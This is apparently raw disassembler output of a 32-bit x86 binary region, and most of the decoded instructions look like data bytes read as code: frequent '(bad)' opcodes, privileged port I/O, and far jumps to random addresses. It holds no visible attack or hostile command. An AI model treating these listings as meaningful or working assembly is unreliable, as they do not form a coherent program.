  421986:	add    dh,BYTE PTR [ebp+0x5847e7c8]
  42198c:	sbb    BYTE PTR [ebx+0x21a8f38d],bl
  421992:	pop    ebx
  421993:	pop    ebp
  421994:	retf   0x8e54
  421997:	cs push 0x0
  42199a:	xor    al,0x4d
  42199c:	push   ds
  42199d:	arpl   WORD PTR [esi-0x7f],si
  4219a0:	ja     0x4219bd
  4219a2:	in     al,0xaa
  4219a4:	xchg   ecx,eax
  4219a5:	xchg   edx,eax
  4219a6:	mov    ebx,0xb6c0679b
  4219ab:	lock jmp 0x660b:0x75322a92
  4219b3:	sub    ah,BYTE PTR [ebx-0xc]
  4219b6:	cmp    DWORD PTR [edi-0x12616d62],edi
  4219bc:	or     BYTE PTR [edi],al
  4219be:	bound  edi,QWORD PTR [ebp-0x4e]
  4219c1:	fist   WORD PTR [eax+0x65]
  4219c4:	test   al,0x1c
  4219c6:	into   
  4219c7:	(bad)  
  4219c8:	push   cs
  4219c9:	mov    ds:0xa5506fa,al
  4219ce:	mov    dl,0x35
  4219d0:	(bad)  
  4219d1:	loopne 0x421a4b
  4219d3:	sub    DWORD PTR [edi+0x3ff75665],edi
  4219d9:	mov    bh,0x2c
  4219db:	sti    
  4219dc:	adc    BYTE PTR [esi+edx*2-0x46579fc4],bh
  4219e3:	in     eax,dx
  4219e4:	call   0x4d5b:0x4537e33a
  4219eb:	aam    0xd7
	...
  421a55:	add    dh,bh
  421a57:	cld    
  421a58:	je     0x421a77
  421a5a:	jbe    0x4219f9
  421a5c:	(bad)  
  421a5d:	(bad)  
  421a5e:	jns    0x421a50
  421a60:	sbb    al,0x7b
  421a62:	(bad)  
  421a63:	stc    
  421a64:	adc    ah,BYTE PTR [ecx-0x2b]
  421a67:	push   0xff0001
  421a6c:	add    BYTE PTR [eax],al
  421a6e:	aad    0x36
  421a70:	xor    ebp,DWORD PTR [ebx+0x31]
  421a73:	and    DWORD PTR [edx],ebx
  421a75:	or     ebp,DWORD PTR [esi-0x65]
  421a78:	jmp    0xe73b50d9
  421a7d:	call   DWORD PTR [esi]
  421a7f:	inc    ebx
  421a80:	jl     0x421a02
  421a82:	inc    edx
  421a83:	sbb    bl,BYTE PTR [edi]
  421a85:	sbb    bh,BYTE PTR [eax-0x4c30683e]
  421a8b:	push   0xffffffdc
  421a8d:	mov    ds:0xadac2428,al
  421a92:	cli    
  421a93:	xchg   ebx,eax
  421a94:	pusha  
  421a95:	int    0x91
  421a97:	pop    ss
  421a98:	adc    edi,edx
  421a9a:	xor    eax,0x5a85f3d1
  421a9f:	add    ebx,ebp
  421aa1:	dec    edi
  421aa2:	bound  ecx,QWORD PTR [eax]
  421aa4:	test   bh,bl
  421aa6:	mov    ds:0x5c80e89c,eax
  421aab:	in     eax,dx
  421aac:	add    al,0x5a
  421aae:	lea    ebp,[eax]
  421ab0:	sbb    DWORD PTR [ebx],edi
  421ab2:	mov    edi,0xee8d4bb8
  421ab7:	fcmovne st,st(0)
  421ab9:	pop    ss
  421aba:	pop    ebp
  421abb:	push   es
  421abc:	mov    edx,0x34e50574
  421ac1:	jb     0x421aa4
  421ac3:	shl    DWORD PTR [esi-0x7593a221],cl
  421ac9:	cmp    ah,ch
  421acb:	fistp  WORD PTR [eax+0x14]
  421ace:	or     dh,BYTE PTR [eax]
  421ad0:	inc    edx
  421ad1:	(bad)  
  421ad2:	(bad)  
  421ad3:	cmp    al,0x20
  421ad5:	jno    0x421a96
  421ad7:	icebp  
  421ad8:	pop    ebx
  421ad9:	jae    0x421aaa
  421adb:	enter  0xea67,0x7
  421adf:	and    BYTE PTR [ebx+0x7f],ch
  421ae2:	neg    DWORD PTR [esi-0x58]
  421ae5:	fisttp QWORD PTR [eax+edi*4+0x37]
  421ae9:	sbb    eax,0x91007de5
  421aee:	jno    0x421a94
  421af0:	repnz lock lods al,BYTE PTR ds:[esi]
  421af3:	stc    
  421af4:	imul   ebx,DWORD PTR [edi+0x62],0x5b
  421af8:	icebp  
  421af9:	mov    bl,0x1b
  421afc:	cmp    edi,eax
  421afe:	call   0xf852f3af
  421b03:	xchg   esp,eax
  421b04:	retf   
  421b05:	jg     0x421aee
  421b07:	inc    esp
  421b08:	fisttp WORD PTR [ebp-0x9c9bb12]
  421b0e:	outs   dx,DWORD PTR ds:[esi]
  421b0f:	jp     0x421b60
  421b11:	sbb    al,0x90
  421b13:	add    ebp,edx
  421b15:	push   edx
  421b16:	mov    edi,edx
  421b18:	push   es
  421b19:	pop    es
  421b1a:	out    0xee,eax
  421b1c:	push   0xffffffd1
  421b1e:	sub    eax,0xfee30b9a
  421b23:	and    BYTE PTR [ecx-0x3a],0xbf
  421b27:	and    ecx,edx
  421b29:	ins    DWORD PTR es:[edi],dx
  421b2a:	pop    eax
  421b2b:	push   0xffffffad
  421b2d:	xlat   BYTE PTR ds:[ebx]
  421b2e:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  421b30:	shr    DWORD PTR [ebx-0x63],0x48
  421b34:	outs   dx,DWORD PTR fs:[esi]
  421b36:	dec    ebp
  421b37:	lahf   
  421b38:	cli    
  421b39:	test   DWORD PTR [ecx-0x7ce8d792],0x633cef59
  421b43:	loopne 0x421ba7
  421b45:	lds    eax,FWORD PTR [esi]
  421b47:	push   ebp
  421b48:	idiv   BYTE PTR [edx+0x4e18ea9a]
  421b4e:	andnps xmm1,xmm0
  421b51:	xchg   esi,eax
  421b52:	add    ah,dl
  421b54:	xor    bh,0xce
  421b57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421b58:	ins    BYTE PTR es:[edi],dx
  421b59:	pop    eax
  421b5a:	sbb    edi,esp
  421b5c:	ds loopne 0x421b3a
  421b5f:	stos   DWORD PTR es:[edi],eax
  421b60:	cmp    ah,al
  421b62:	pop    ecx
  421b63:	ret    0xaa27
  421b66:	out    0xd6,al
  421b68:	push   es
  421b69:	inc    esi
  421b6a:	ror    BYTE PTR [esi+0x68],cl
	...
  421bd4:	add    BYTE PTR [eax],al
  421bd6:	push   ss
  421bd7:	cdq    
  421bd8:	jmp    0x37400baa
  421bdd:	fild   DWORD PTR [ecx+eax*8+0x28]
  421be1:	or     dh,BYTE PTR [ebx]
  421be3:	daa    
  421be4:	(bad)  
  421be5:	push   eax
  421be6:	aam    0x69
  421be8:	add    DWORD PTR [eax],eax
  421bea:	inc    DWORD PTR [eax]
  421bec:	add    BYTE PTR [eax],al
  421bee:	mov    al,ds:0x5bf85655
  421bf3:	dec    ebx
  421bf4:	push   ebp
  421bf5:	fnstsw WORD PTR ds:0x7bada37e
  421bfb:	xchg   DWORD PTR [edx+0x6a3aeaec],esp
  421c01:	data16 or BYTE PTR [edx],ch
  421c04:	xchg   ebp,eax
  421c05:	daa    
  421c06:	cmp    ebp,DWORD PTR [ecx+ecx*4-0x266ce08c]
  421c0d:	iret   
  421c0e:	test   BYTE PTR [edx+ebp*8-0xf],cl
  421c12:	inc    ecx
  421c13:	xchg   ebx,eax
  421c14:	mov    edx,0xcc7a3480
  421c19:	ret    
  421c1a:	dec    ecx
  421c1b:	adc    al,0xe9
  421c1d:	sub    ch,BYTE PTR ds:0xb3ba9cda
  421c23:	iret   
  421c24:	lahf   
  421c25:	jbe    0x421c18
  421c27:	(bad)  
  421c28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c29:	push   ecx
  421c2a:	clc    
  421c2b:	mov    bl,0x6d
  421c2d:	rol    DWORD PTR [esi+0x49],1
  421c30:	add    BYTE PTR [eax-0x47],ah
  421c33:	push   ebp
  421c34:	inc    ebx
  421c35:	adc    eax,0xcb5bb99
  421c3a:	push   ss
  421c3b:	ret    
  421c3c:	or     BYTE PTR [edx+0x6b573de4],ch
  421c42:	rol    edi,0xb5
  421c45:	xor    DWORD PTR [ebp-0x4c],esp
  421c48:	rol    BYTE PTR [ebx-0x14393481],cl
  421c4e:	jle    0x421c3c
  421c50:	das    
  421c51:	imul   eax,DWORD PTR [ebx],0x47f5959d
  421c57:	js     0x421c4e
  421c59:	mov    ss,WORD PTR ds:0xa0191a5d
  421c5f:	xchg   esi,eax
  421c60:	or     esp,ebx
  421c62:	icebp  
  421c63:	cdq    
  421c64:	outs   dx,BYTE PTR ds:[esi]
  421c65:	aam    0x91
  421c67:	pop    eax
  421c68:	cs pop ss
  421c6a:	and    esp,esi
  421c6c:	mov    al,ds:0xcf600cb4
  421c71:	sub    BYTE PTR [edi],dl
  421c73:	and    eax,0x57e70f7
  421c78:	into   
  421c79:	mov    bh,0xb6
  421c7b:	inc    eax
  421c7c:	rcl    eax,1
  421c7e:	pop    ss
  421c7f:	retf   0xd3fd
  421c82:	inc    esi
  421c83:	rol    BYTE PTR [ebp+0x2b],1
  421c86:	add    al,0xe3
  421c88:	int    0xf0
  421c8a:	shl    BYTE PTR [edx+0x6d],1
  421c8d:	fs mov bl,0x64
  421c90:	cmp    eax,0xf0f7edbe
  421c95:	push   eax
  421c96:	mul    DWORD PTR [esi+ebx*1-0x47]
  421c9a:	test   ah,al
  421c9c:	mov    cl,0xc6
  421c9e:	pop    esi
  421c9f:	pop    esp
  421ca0:	rol    dh,cl
  421ca2:	test   al,0x3e
  421ca4:	retf   
  421ca5:	mov    eax,0xd6dedf9a
  421caa:	stos   DWORD PTR es:[edi],eax
  421cab:	mov    bl,0x95
  421cad:	shr    BYTE PTR [ecx+0x1d],1
  421cb0:	xor    esi,DWORD PTR [ebx]
  421cb2:	jmp    0x423fa6a4
  421cb7:	nop
  421cb8:	(bad)  
  421cb9:	mov    esp,0xe7f28a0f
  421cbe:	push   es
  421cbf:	mov    ebp,fs
  421cc1:	jnp    0x421cb8
  421cc3:	adc    eax,0xe5cd68e8
  421cc8:	jo     0x421c5b
  421cca:	data16 mov al,0xb1
  421ccd:	push   ebx
  421cce:	cmp    eax,0x390b347a
  421cd3:	push   ebx
  421cd4:	push   ebx
  421cd5:	fimul  DWORD PTR [eax-0x64ac60a9]
  421cdb:	mov    ecx,ds
  421cdd:	lahf   
  421cde:	addr16 aad 0x4b
  421ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ce2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ce3:	cmp    BYTE PTR [edx-0x31],ah
  421ce6:	idiv   DWORD PTR [ecx]
  421ce8:	out    0xf8,al
  421cea:	test   DWORD PTR [edx+0x39],0x0
	...
  421d55:	add    BYTE PTR [eax-0x1a4a95],dh
  421d5b:	push   eax
  421d5d:	jg     0x421db3
  421d5f:	dec    edi
  421d60:	xchg   edx,eax
  421d61:	dec    edi
  421d62:	aad    0x86
  421d64:	je     0x421d91
  421d66:	shr    DWORD PTR [edx+0x1],cl
  421d69:	add    bh,bh
  421d6b:	add    BYTE PTR [eax],al
  421d6d:	add    BYTE PTR [ecx],ah
  421d6f:	fs pop edx
  421d71:	lea    esp,[ecx]
  421d73:	out    dx,eax
  421d74:	xchg   edx,eax
  421d75:	mov    al,ds:0xb1096c95
  421d7a:	cmp    eax,0xef7e491
  421d7f:	popf   
  421d80:	mov    ebp,DWORD PTR [ebx+0x7e3e2727]
  421d86:	ret    
  421d87:	data16 ror BYTE PTR [esi+0x70],1
  421d8b:	jl     0x421db8
  421d8d:	pop    edi
  421d8e:	add    DWORD PTR [edx],esp
  421d90:	dec    ebx
  421d91:	sbb    ch,BYTE PTR [edx+0x4502f6a1]
  421d97:	mov    eax,ds:0x571bf982
  421d9c:	rcl    DWORD PTR [esi+0x69e446a2],cl
  421da2:	fist   WORD PTR [ecx-0x4eebc8eb]
  421da8:	rol    BYTE PTR [eax],1
  421daa:	xchg   esi,eax
  421dab:	push   ebx
  421dac:	cmp    bh,al
  421dae:	lahf   
  421daf:	dec    ebp
  421db0:	inc    edx
  421db1:	xchg   ebx,eax
  421db2:	xchg   ebp,eax
  421db3:	mov    ebp,0x9a7376fd
  421db8:	or     ah,BYTE PTR [ebp+ecx*2+0x35]
  421dbc:	inc    eax
  421dbd:	aam    0x89
  421dbf:	jmp    FWORD PTR [esi-0x211e11c8]
  421dc5:	int3   
  421dc6:	xor    ch,BYTE PTR [eax]
  421dc8:	add    DWORD PTR [ebp+0x757fdb35],0x68cd46a3
  421dd2:	inc    edi
  421dd3:	jne    0x421d90
  421dd5:	xchg   esp,eax
  421dd7:	lea    esp,[ecx-0x69516572]
  421ddd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dde:	scas   al,BYTE PTR es:[edi]
  421ddf:	mov    esp,0xd7dd3be8
  421de4:	fisttp DWORD PTR [eax-0x68]
  421de7:	jp     0x421e3b
  421de9:	xor    eax,0xad878595
  421dee:	mov    dh,0x2
  421df0:	lods   al,BYTE PTR ds:[esi]
  421df1:	sub    bl,BYTE PTR [ebp-0x12b3787e]
  421df7:	sbb    BYTE PTR [edx+0x2e],ch
  421dfa:	enter  0xfa4e,0x89
  421dfe:	push   esp
  421dff:	push   0x686281ea
  421e04:	leave  
  421e05:	mov    bh,0x62
  421e07:	dec    esp
  421e08:	xchg   eax,eax
  421e0a:	push   cs
  421e0b:	mov    ds:0x9faf7740,al
  421e10:	pop    ecx
  421e11:	jbe    0x421e1c
  421e13:	dec    ebp
  421e14:	mov    ah,0xeb
  421e16:	or     BYTE PTR [eax+0x9a191a8],cl
  421e1c:	pop    eax
  421e1d:	adc    BYTE PTR [ebx+edi*8-0x1e],dh
  421e21:	xchg   ecx,eax
  421e22:	jecxz  0x421e58
  421e24:	ror    BYTE PTR [eax],cl
  421e26:	cwde   
  421e27:	push   edx
  421e28:	int3   
  421e29:	mov    WORD PTR [eax+0x739947c4],?
  421e2f:	xchg   esi,eax
  421e30:	jo     0x421e93
  421e32:	aas    
  421e33:	mov    edi,0xd3f27f9b
  421e38:	push   esi
  421e39:	loopne 0x421de9
  421e3b:	mov    eax,0x7abfa829
  421e40:	inc    ebp
  421e41:	adc    ecx,eax
  421e43:	sub    DWORD PTR [ebp-0xae47a06],ebx
  421e49:	int3   
  421e4a:	loop   0x421e8a
  421e4c:	mov    bl,0x7
  421e4e:	cmp    eax,0x85d1d228
  421e53:	jmp    0x421deb
  421e55:	mov    eax,0x16938a03
  421e5a:	arpl   ax,ax
  421e5c:	push   0xa8d8f1c2
  421e61:	std    
  421e62:	jge    0x421e16
  421e64:	push   esp
  421e65:	(bad)  
  421e66:	push   0x71f1bc3f
  421e6b:	aaa    
  421e6c:	push   ecx
	...
  421ed5:	add    bh,cl
  421ed7:	mov    eax,ds:0xbf7f851b
  421edc:	fucomip st,st(3)
  421ede:	push   es
  421edf:	ins    BYTE PTR es:[edi],dx
  421ee0:	xor    al,0xb9
  421ee2:	xlat   BYTE PTR ds:[ebx]
  421ee3:	jmp    0x6c14e6f5
  421ee8:	add    DWORD PTR [eax],eax
  421eea:	inc    DWORD PTR [eax]
  421eec:	add    BYTE PTR [eax],al
  421eee:	test   al,0xc0
  421ef0:	mov    bh,0xd5
  421ef2:	(bad)  
  421ef3:	inc    esp
  421ef4:	pop    esi
  421ef5:	jge    0x421ec8
  421ef7:	vpmaddwd xmm2,xmm0,XMMWORD PTR [ecx]
  421efb:	mov    al,ds:0x5a0247
  421f00:	jl     0x421e95
  421f02:	sbb    ah,BYTE PTR [eax]
  421f04:	lock sbb edi,DWORD PTR [esi]
  421f07:	cmp    edi,ecx
  421f09:	sub    bl,BYTE PTR [ebx]
  421f0b:	sub    DWORD PTR [ecx],esi
  421f0d:	repz or eax,0x5622468b
  421f13:	cli    
  421f14:	jmp    0xd32c:0x1fbb9dd4
  421f1b:	mov    ah,0xda
  421f1d:	sub    ch,BYTE PTR [esi]
  421f1f:	cdq    
  421f20:	push   ecx
  421f21:	or     al,0x21
  421f23:	pop    esp
  421f24:	arpl   WORD PTR [edx+0x43],sp
  421f27:	mov    gs,edx
  421f29:	or     ah,BYTE PTR [edx*2+0x5dc4fbb8]
  421f30:	data16 das 
  421f32:	(bad)  
  421f33:	fsubr  DWORD PTR [ebp+0x47ceb032]
  421f39:	addr16 out dx,al
  421f3b:	mov    edi,ds
  421f3d:	out    dx,al
  421f3e:	rcl    BYTE PTR [ebx],1
  421f40:	adc    DWORD PTR [eax+0xad72910],ebp
  421f46:	mov    ds:0x5f31712f,eax
  421f4b:	jno    0x421f35
  421f4d:	cld    
  421f4e:	mov    bl,0x84
  421f50:	xchg   esi,eax
  421f51:	adc    esi,DWORD PTR [edi]
  421f53:	out    dx,al
  421f54:	and    dl,0xe
  421f57:	fiadd  DWORD PTR [edx+ebx*8]
  421f5a:	fs cmp al,0x9f
  421f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f5e:	inc    esp
  421f5f:	dec    ebx
  421f60:	shr    DWORD PTR [esi-0x3867605e],1
  421f66:	aas    
  421f67:	into   
  421f68:	loope  0x421f60
  421f6a:	and    BYTE PTR [ebx+0x15065ba0],0xd
  421f71:	sub    eax,0xa7b83d1
  421f76:	into   
  421f77:	shl    DWORD PTR [ecx+ebx*1-0x748eef67],0xd7
  421f7f:	sbb    eax,0x68d993d4
  421f84:	mov    edx,DWORD PTR [edx-0x4be1da5a]
  421f8a:	adc    al,0x6
  421f8c:	and    esp,DWORD PTR [edi-0x7911a87a]
  421f92:	pop    ss
  421f93:	cli    
  421f94:	loopne 0x421fef
  421f96:	push   ds
  421f97:	sub    esi,DWORD PTR ds:0x16c2b552
  421f9d:	scas   eax,DWORD PTR es:[edi]
  421f9e:	inc    ebx
  421f9f:	mov    al,0x8e
  421fa1:	cdq    
  421fa2:	and    eax,DWORD PTR [edx]
  421fa4:	mov    gs,WORD PTR [ebx]
  421fa6:	adc    DWORD PTR [edx],esp
  421fa8:	push   ebx
  421fa9:	jmp    0x421f4b
  421fab:	addr16 stc 
  421fad:	xchg   ecx,eax
  421fae:	pushf  
  421faf:	jle    0x42201f
  421fb1:	push   ds
  421fb2:	pop    esp
  421fb3:	adc    esi,DWORD PTR [eax-0x49d4f285]
  421fb9:	cmp    DWORD PTR [edx-0x3fbe6111],ebp
  421fbf:	retf   0x17ef
  421fc2:	xchg   ecx,eax
  421fc3:	std    
  421fc4:	into   
  421fc5:	outs   dx,BYTE PTR ds:[esi]
  421fc6:	jle    0x421f87
  421fc8:	inc    esi
  421fc9:	or     BYTE PTR [edi],bh
  421fcb:	clc    
  421fcc:	imul   esi,DWORD PTR [ebx],0xe9a4d79b
  421fd2:	lods   eax,DWORD PTR ds:[esi]
  421fd3:	jb     0x421fbd
  421fd5:	inc    edx
  421fd6:	cmp    BYTE PTR [eax-0x4e3df060],bl
  421fdc:	dec    esp
  421fdd:	inc    eax
  421fde:	std    
  421fdf:	enter  0x29af,0xf8
  421fe3:	out    dx,al
  421fe4:	rcr    DWORD PTR [esp+ecx*8],0xd3
  421fe8:	inc    ebp
  421fe9:	addr16 sbb al,0x99
  421fec:	push   ds
	...
  422055:	add    BYTE PTR [ebx+0x6],ch
  422058:	(bad)  
  422059:	dec    edi
  42205a:	out    dx,eax
  42205b:	iret   
  42205c:	jmp    0x422084
  42205e:	aas    
  42205f:	in     eax,dx
  422060:	push   es
  422061:	dec    di
  422063:	push   0x1
  422065:	sub    edx,ecx
  422067:	ins    BYTE PTR es:[edi],dx
  422068:	add    DWORD PTR [eax],eax
  42206a:	inc    DWORD PTR [eax]
  42206c:	add    BYTE PTR [eax],al
  42206e:	jmp    0x308a9fae
  422073:	xchg   esp,eax
  422074:	cwde   
  422075:	sti    
  422076:	lds    edx,FWORD PTR [esi+0x37bc085b]
  42207c:	clc    
  42207d:	fsubr  QWORD PTR [ebx+0x3]
  422080:	ins    DWORD PTR es:[edi],dx
  422081:	sbb    cl,BYTE PTR [eax-0x62]
  422084:	dec    esi
  422085:	cmp    eax,0x702c5c8e
  42208a:	data16 rcr BYTE PTR [edx+0x52ca3ef8],0x4c
  422092:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422093:	cmc    
  422094:	adc    DWORD PTR [eax+0x3d],ecx
  422097:	fisub  DWORD PTR [esi+0x58]
  42209a:	sub    dh,bh
  42209c:	scas   al,BYTE PTR es:[edi]
  42209d:	push   ebp
  42209e:	cmp    esp,DWORD PTR [ebx]
  4220a0:	adc    al,0x23
  4220a2:	xlat   BYTE PTR ds:[ebx]
  4220a3:	bound  esp,QWORD PTR [edi]
  4220a5:	ss pop ebp
  4220a7:	adc    al,0xa4
  4220a9:	jge    0x4220ff
  4220ab:	adc    BYTE PTR [si],0x34
  4220af:	rol    esi,cl
  4220b1:	mov    edi,0x9cefd02d
  4220b6:	xor    al,0xe8
  4220b8:	cld    
  4220b9:	jbe    0x422061
  4220bb:	jno    0x422088
  4220bd:	xor    eax,0x6b8c539b
  4220c2:	dec    esi
  4220c3:	enter  0xe765,0x80
  4220c7:	mov    esp,0x5f941dac
  4220cc:	xor    dh,BYTE PTR [edx*8+0x9c773d3]
  4220d3:	add    eax,0x4099d18
  4220d8:	push   ebx
  4220d9:	stos   DWORD PTR es:[edi],eax
  4220da:	mov    bl,0x53
  4220dc:	and    cl,BYTE PTR [esi+0x69]
  4220df:	jbe    0x4220a5
  4220e1:	pop    ebx
  4220e2:	pop    es
  4220e3:	mov    edi,0xf3340ac8
  4220e8:	dec    ebp
  4220e9:	cmp    dl,BYTE PTR [eax]
  4220eb:	adc    esp,DWORD PTR [ebx]
  4220ed:	loopne 0x422169
  4220ef:	in     al,dx
  4220f0:	in     eax,dx
  4220f1:	lea    edi,[ebp+0x1e]
  4220f4:	repz mov al,0x1a
  4220f7:	rol    BYTE PTR [edi-0x53],0x5
  4220fb:	daa    
  4220fc:	add    esp,DWORD PTR [edi-0x3e907125]
  422102:	sub    ecx,DWORD PTR [esi]
  422104:	pop    edx
  422105:	and    BYTE PTR [ecx-0xef047bc],0x56
  42210c:	mov    dl,0xa8
  42210e:	push   ss
  42210f:	mov    dl,0xbf
  422111:	test   eax,0xe07171bc
  422116:	lods   al,BYTE PTR ds:[esi]
  422117:	fld    QWORD PTR ds:0x271e673d
  42211d:	ret    
  42211e:	inc    ebp
  42211f:	lods   eax,DWORD PTR ds:[esi]
  422120:	dec    ebp
  422121:	pop    ecx
  422122:	push   esi
  422123:	loope  0x422172
  422125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422126:	or     edx,DWORD PTR [edi]
  422128:	gs ss popa 
  42212b:	pop    eax
  42212c:	dec    edx
  42212d:	jg     0x4220e1
  42212f:	push   esi
  422130:	dec    ebp
  422131:	imul   ecx,DWORD PTR [ebx+0x77],0x37
  422135:	out    0x7e,eax
  422137:	call   0xed95:0x2b662ee2
  42213e:	clc    
  42213f:	call   0x5ebe8a6d
  422144:	js     0x4220d1
  422146:	push   ebx
  422147:	mov    edx,DWORD PTR [ecx-0x3c]
  42214a:	pop    edx
  42214b:	popa   
  42214c:	xor    bl,dh
  42214e:	mov    ebp,0xb270af78
  422153:	pop    edi
  422154:	movups xmm0,xmm3
  422157:	xor    dl,ch
  422159:	mov    edx,0xb58a21dc
  42215e:	mov    ds:0x103511aa,al
  422163:	mov    edx,0xf84e086d
  422168:	repnz loope 0x42211f
  42216b:	cmp    BYTE PTR [ecx+0x0],ah
	...
  4221d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221d7:	push   edx
  4221d8:	jnp    0x4221d7
  4221da:	(bad)  
  4221db:	std    
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	pop    ebx
  4221de:	dec    edx
  4221df:	sub    al,0x42
  4221e1:	sub    eax,DWORD PTR [eax]
  4221e3:	test   DWORD PTR [esi],ecx
  4221e5:	and    eax,edx
  4221e7:	ins    DWORD PTR es:[edi],dx
  4221e8:	add    DWORD PTR [eax],eax
  4221ea:	inc    DWORD PTR [eax]
  4221ec:	add    BYTE PTR [eax],al
  4221ee:	inc    esi
  4221ef:	or     al,0x10
  4221f1:	cwde   
  4221f2:	mov    esi,0x69a241cc
  4221f7:	fiadd  WORD PTR [edx]
  4221f9:	pop    eax
  4221fa:	ja     0x42225c
  4221fc:	cwde   
  4221fd:	pop    ss
  4221fe:	(bad)  
  422200:	and    BYTE PTR [edx-0x5a],dh
  422203:	outs   dx,DWORD PTR ds:[esi]
  422204:	outs   dx,BYTE PTR ds:[esi]
  422205:	push   cs
  422206:	xchg   ecx,eax
  422207:	imul   edi,esi,0x28
  42220a:	cmp    dl,dh
  42220c:	jg     0x4221f2
  42220e:	in     al,dx
  42220f:	popa   
  422210:	adc    eax,0x41773e3a
  422215:	mov    ebp,DWORD PTR [ebx]
  422217:	rcl    BYTE PTR [edx-0x1cd31cd3],cl
  42221d:	mov    ah,0x90
  42221f:	leave  
  422220:	mov    bh,0x40
  422222:	addps  xmm3,XMMWORD PTR [ecx+ebx*2-0x45f4a0e]
  42222a:	out    dx,eax
  42222b:	loopne 0x422268
  42222d:	icebp  
  42222e:	(bad)  
  42222f:	sti    
  422230:	imul   eax,ecx,0x0
  422233:	mov    bh,bh
  422235:	xchg   edx,eax
  422236:	inc    eax
  422237:	sbb    bh,BYTE PTR [ebx-0x16016f37]
  42223d:	and    DWORD PTR [eax-0x31bb96b6],ebp
  422243:	push   ss
  422244:	mov    al,ds:0xe6832251
  422249:	inc    esi
  42224a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42224b:	rcl    dh,0x97
  42224e:	fmul   QWORD PTR [ecx-0x56]
  422251:	lods   al,BYTE PTR ds:[esi]
  422252:	xchg   BYTE PTR [ebp-0x2e],ah
  422255:	icebp  
  422256:	add    dh,BYTE PTR [edi]
  422258:	push   0x808ba839
  42225d:	jle    0x422270
  42225f:	add    al,0xe4
  422261:	retf   
  422262:	out    dx,eax
  422263:	imul   ebp,DWORD PTR [ebx+0x4bf1f267],0x381c8649
  42226d:	das    
  42226e:	lock addr16 sub al,0x26
  422272:	mov    eax,0xb2cd3a59
  422277:	push   eax
  422278:	not    edi
  42227a:	test   BYTE PTR [edx-0x7],dh
  42227d:	sbb    esp,DWORD PTR [ebp-0x4886a567]
  422283:	push   0x97e34dc1
  422288:	sub    ch,cl
  42228a:	or     dl,BYTE PTR [eax-0x8bd94ce]
  422290:	or     BYTE PTR [ebx],cl
  422292:	pushf  
  422293:	inc    edx
  422294:	jbe    0x42221a
  422296:	xor    eax,0x9ec4baea
  42229b:	shl    BYTE PTR [edi+eax*4],1
  42229e:	loopne 0x42227b
  4222a0:	je     0x4222e3
  4222a2:	xor    BYTE PTR [ebx],al
  4222a4:	jmp    0xe7a:0x38fc8666
  4222ab:	or     BYTE PTR [ecx+0x37b32815],bl
  4222b1:	dec    ebx
  4222b2:	xor    bl,cl
  4222b4:	fsubr  DWORD PTR [edi+edi*1+0x316e8644]
  4222bb:	push   0x7f2305d1
  4222c0:	sahf   
  4222c1:	jno    0x422311
  4222c3:	xor    eax,0xb02c073e
  4222c8:	daa    
  4222c9:	into   
  4222ca:	xor    BYTE PTR [eax-0x2617c15c],bh
  4222d0:	jae    0x42227a
  4222d2:	ret    0x9fd8
  4222d5:	mov    dh,BYTE PTR [ecx]
  4222d7:	xor    DWORD PTR [edi],0x42e6c91b
  4222dd:	imul   esp,DWORD PTR [ebx],0x57
  4222e0:	inc    ebp
  4222e1:	dec    edi
  4222e2:	mov    ebp,DWORD PTR [ebx]
  4222e4:	or     ah,BYTE PTR [edx+0x4a]
  4222e7:	dec    edi
  4222e8:	dec    esi
  4222e9:	add    eax,0x4f502
	...
  422356:	(bad)  
  422357:	in     eax,dx
  422358:	lods   eax,DWORD PTR ds:[esi]
  422359:	imul   edi
  42235b:	neg    edi
  42235d:	std    
  42235e:	sub    ebx,DWORD PTR [ebp+0x71]
  422361:	dec    ecx
  422362:	test   DWORD PTR [eax],esp
  422364:	jo     0x4223e2
  422366:	iret   
  422367:	outs   dx,BYTE PTR ds:[esi]
  422368:	add    DWORD PTR [eax],eax
  42236a:	inc    DWORD PTR [eax]
  42236c:	add    BYTE PTR [eax],al
  42236e:	push   eax
  42236f:	jo     0x4223b3
  422371:	add    esi,DWORD PTR [ecx-0x54]
  422374:	jne    0x4223ef
  422376:	out    0x42,eax
  422378:	or     al,0x3e
  42237a:	ins    BYTE PTR es:[edi],dx
  42237b:	dec    esp
  42237c:	xor    ch,dh
  42237e:	sahf   
  42237f:	test   ebp,esp
  422381:	rcl    BYTE PTR [ebx],cl
  422383:	adc    eax,0x54e45e9d
  422388:	loop   0x4223e1
  42238a:	cs in  al,dx
  42238c:	jns    0x4223e1
  42238e:	cmp    edx,DWORD PTR [ebx+edi*4+0x5]
  422392:	into   
  422393:	jecxz  0x42231f
  422395:	iret   
  422396:	loop   0x422324
  422398:	mov    edi,ebp
  42239a:	shr    DWORD PTR [ecx],1
  42239c:	inc    DWORD PTR [edi-0x11]
  42239f:	sar    BYTE PTR [ebx-0x7c],0x84
  4223a3:	mov    edi,0xca67c4b6
  4223a8:	pop    esi
  4223a9:	shr    DWORD PTR [ebx+eax*2+0x67],cl
  4223ad:	in     al,dx
  4223ae:	or     dh,BYTE PTR [ecx+edi*4]
  4223b1:	mov    ch,0x22
  4223b3:	imul   edi,DWORD PTR [edx],0x5d21acaf
  4223b9:	inc    esp
  4223ba:	push   ebp
  4223bb:	loopne 0x42237d
  4223bd:	fs int3 
  4223bf:	xchg   esi,eax
  4223c0:	xchg   DWORD PTR [esi],edx
  4223c2:	jp     0x422354
  4223c4:	sub    esi,edi
  4223c6:	or     DWORD PTR [ebp+0x3ea3fd01],ebp
  4223cc:	fcmovu st,st(1)
  4223ce:	das    
  4223cf:	ss ret 
  4223d1:	mov    bh,0x4
  4223d3:	inc    edi
  4223d4:	ins    DWORD PTR es:[edi],dx
  4223d5:	adc    eax,DWORD PTR [edx-0x3e]
  4223d8:	pop    ecx
